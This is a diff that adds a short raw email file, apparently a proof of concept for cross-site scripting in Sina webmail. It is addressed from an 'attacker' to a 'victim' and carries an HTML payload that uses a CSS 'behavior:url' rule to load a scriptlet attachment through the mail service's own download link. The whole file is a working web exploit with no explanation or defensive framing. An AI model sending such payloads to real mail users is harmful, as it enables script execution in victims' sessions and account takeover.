@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: test
+To: victim@sina.com
+MIME-Version: 1.0
+Content-type: text/html
+
+xss<x style="behavior:url(base_download_att.php?file_name=test.sct&file_size=367.5&mid=02BB29DB41F5347D476D455DC6C699DEE600000000000002&content_type=application/octet-stream&attinfo=4-1533-2023-base64&fid=out)"></x>
